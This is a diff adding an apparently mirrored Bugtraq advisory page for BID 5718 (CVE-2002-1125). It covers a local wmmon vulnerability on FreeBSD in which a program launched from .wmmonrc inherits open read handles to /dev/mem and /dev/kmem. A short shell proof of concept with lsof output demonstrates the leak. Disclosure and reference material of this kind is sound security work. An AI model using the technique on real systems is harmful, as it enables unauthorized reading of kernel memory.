@@ -1,0 +1,118 @@
+#SpeeDr00t@Black Falcon<br>#bid5718<p><b><span style="font-size: 18pt;">WMMon Memory Character File Open File Descriptor Read Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/5718/info">info</a><br><a href="http://www.securityfocus.com/bid/5718/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/5718/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/5718/solution">solution</a><br><a href="http://www.securityfocus.com/bid/5718/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				5718
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Access Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2002-1125<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Sep 16 2002 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 11 2009 05:06PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Vulnerability discovery credited to &lt;badc0ded@badc0ded.com&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Windowmaker wmmon 1.0 b2<br/>
+<span class="related">
+						
+							-
+						
+						FreeBSD FreeBSD 3.3 <br/>
+</span>
+					
+				
+					FreeBSD FreeBSD 4.6 <br/>
+					
+				
+					FreeBSD FreeBSD 4.5 <br/>
+					
+				
+					FreeBSD FreeBSD 4.4 <br/>
+					
+				
+					FreeBSD FreeBSD 4.3 <br/>
+					
+				
+					FreeBSD FreeBSD 4.2 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof of concept has been made available:<br/><br/>bash-2.05a$ cat .wmmonrc<br/>left "/home/dim/dummy"<br/>bash-2.05a$ wmmon &amp;amp;<br/>1 793<br/>bash-2.05a$ Monitoring 5 devices for activity.<br/>current stat is :1<br/><br/>bash-2.05a$ /usr/local/sbin/lsof |grep dummy|grep mem<br/>dummy 797 dim 3r VCHR 2,0 0t0 21146 /dev/mem<br/>dummy 797 dim 4r VCHR 2,1 0xc040f54c 21145 /dev/kmem
+	
+		<ul>
+</ul>
+</div>
